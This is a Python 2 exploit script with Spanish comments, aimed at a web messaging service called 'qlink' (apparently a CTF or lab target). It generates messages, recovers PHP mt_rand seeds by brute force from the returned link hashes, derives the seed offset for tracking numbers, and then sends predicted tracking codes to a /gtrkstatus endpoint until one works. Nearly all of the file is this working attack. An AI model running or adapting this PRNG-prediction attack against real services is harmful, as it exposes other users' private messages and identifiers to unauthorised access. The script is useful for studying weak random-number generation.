# -*- coding: utf-8 -*-

import sys
import requests
import base64
import binascii
import hashlib
from Crypto.Cipher import AES
import math
import time
import php_rand

###############################################################################

url = 'http://qlink'
esperar = False # para esperar un segundo entre requests

###############################################################################

# sesión de módulo requests, para usar keep-alive
sess = requests.Session()

# encabezados http, copiados de un navegador
headers = {
        'Accept':'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'es-419,es;q=0.8',
        'Connection':'keep-alive',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'Host':url.replace('http://', '').replace('https://', ''),
        'Origin':url,
        'Referer':url+'/',
        'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36',
        'X-Requested-With':'XMLHttpRequest'
}

# obtener token fresco
r = sess.get(url + '/tokenizer', headers=headers, data={})
x_token = r.json()['x_token']

# dentro de una función ahora
def generar_qlink(mensaje_ql):

    # generar parámetro simulando javascript de Date().getTime()
    random_hash = int(time.time()) * 1000

    # mensaje
    mensaje = mensaje_ql
    mensaje = "%%A%%" + mensaje + "%%C%%"

    # password, salt e iv cualesquiera
    password = b'123456'
    salt = "ffffffffffffffff"
    iv = "ffffffffffffffffffffffffffffffff"
    iters = 100

    # generación de llave para aes, simulando también versión original javascript
    llave = hashlib.pbkdf2_hmac('sha1', password, binascii.unhexlify(salt), iters, dklen=32)

    # cifrado
    cipher = AES.new(llave, AES.MODE_CBC, binascii.unhexlify(iv))
    data = base64.b64encode(cipher.encrypt(mensaje.ljust(int(math.ceil(len(mensaje) / 16.0) * 16), b'\0')))

    # para envío a web-service
    data = {
            'msg':'{"data":"' + data + '","salt":"' + salt + '","iv":"' + iv + '","iter":' + str(iters) + ',"decom":"false"}',
            'imprint':'false',
            'captcha':'false',
            'randomHash':random_hash,
            'from':'web_app',
            'x_token':x_token,
            'lang':'es',
            'replyIntent':'false',
            'n':'180'
    }

    # envío a servidor y retorno de qlink generado
    r = sess.post(url + '/inject', headers=headers, data=data)
    return (r.json()['hash'] + '#' + password, (r.json()['tn']).replace('DN ', ''))

# obtención de semilla por fuerza bruta desde máximo (fecha/hora actual)
def obtener_semilla(parcial_qlink):
    chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    epoch = int(time.time())
    # aproximaciones...
    len_prueba = 60*60*24*1000*2 # probar a lo sumo dos días hacia atrás desde máximo posible 
    ii = 99999 + 999 + epoch * 1001
    max = 0
    for i in xrange(len_prueba):
        php_rand.mt_srand((0xFFFFFFFF & (ii-i)))
        for j in range(len(parcial_qlink)):
            g = php_rand.mt_rand(0, len(chars)-1)
            if chars[g] != parcial_qlink[j]:
                break
            if (j + 1 > max):
                max = j + 1
                if max == 10:
                    return ii-i
        if (i % 100000 == 0):
            print ".",
            sys.stdout.flush()

# obtención de semilla de número dn
def obtener_semilla_dn(dn_qlink, semilla):
    chars = '0123456789'
    ii = semilla
    # aproximaciones...
    len_prueba = 2*99999 # probar a lo sumo dos segundos hacia adelante (parte en microsegundos que se agrega)
    max = 0
    for i in xrange(len_prueba):
        php_rand.mt_srand((0xFFFFFFFF & (ii+i)))
        for j in range(len(dn_qlink)):
            g = php_rand.mt_rand(0, len(chars)-1)
            if chars[g] != dn_qlink[j]:
                break
            if (j + 1 > max):
                max = j + 1
                if max == 10:
                    return ii+i
        if (i % 100000 == 0):
            print ".",
            sys.stdout.flush()

# obtención de semilla de número dn específica
def obtener_semilla_dn_fix(semilla):
    chars = '0123456789'
    ii = semilla
    php_rand.mt_srand((0xFFFFFFFF & (ii)))
    ret = ''
    for j in range(10):
        g = php_rand.mt_rand(0, len(chars)-1)
        ret = ret + chars[g]
    return ret
    
# generación de un qlink
(ql, dn_original) = generar_qlink('prueba')
print 'qlink generado (ejemplo): ' + ql + ' dn obtenido: ' + dn_original
sys.stdout.flush()

# obtener semilla
print 'obteniendo semilla...'
sys.stdout.flush()
ql_parcial = ql[len(url) + 5:len(url) + 15]
semilla_ = obtener_semilla(ql_parcial)
print
print 'semilla de qlink generado: ' + ql_parcial + ' -> ' + str(semilla_)

# # obtener semilla de dn
# semilla_dn_ = obtener_semilla_dn(dn_original, semilla_)
# print
# print 'semilla de dn generado: ' + dn_original + ' -> ' + str(semilla_dn_)
# print 'diferencia: ' + str(semilla_dn_ - semilla_)

max_req_timing = 10
ql = max_req_timing * [0]
dn = max_req_timing * [0]
max_diff = 0
min_diff = 9999999
for i in range(max_req_timing):
    (ql[i], dn[i]) = generar_qlink('prueba #' + str(i))
    print 'qlink para timing #' + str(i) + ' generado: ' + ql[i] + ' dn: ' + str(dn[i])
    sys.stdout.flush()
    if esperar:
        print 'esperando un segundo...'
        time.sleep(1)

for i in range(max_req_timing):
    ql_parcial = ql[i][len(url) + 5:len(url) + 15]
    s = obtener_semilla(ql_parcial)
    s2 = obtener_semilla_dn(dn[i], s)
    print
    diff = s2 - s
    if diff > max_diff:
        max_diff = diff
    if diff < min_diff:
        min_diff = diff
    print 'diferencia entre semilla para qlink/dn #' + str(i) + ': ' + str(diff)

for i in range(max_diff - min_diff):
    ii = semilla_ + min_diff + i
    trk = obtener_semilla_dn_fix(ii)
    print 'probando semilla: ' + str(ii) + ' trk: ' + str(trk) + ' (' + str(i) + '/' + str(max_diff - min_diff) + ')...'
    data = { 'trk': trk }
    r = sess.post(url + '/gtrkstatus', headers=headers, data=data)
    status = r.json()['status']
    trkStatus = r.json()['trkStatus']
    print 'status: ' + status
    if status != 'FAIL':
        break
    sys.stdout.flush()
    if esperar:
        print 'esperando un segundo...'
        time.sleep(1)
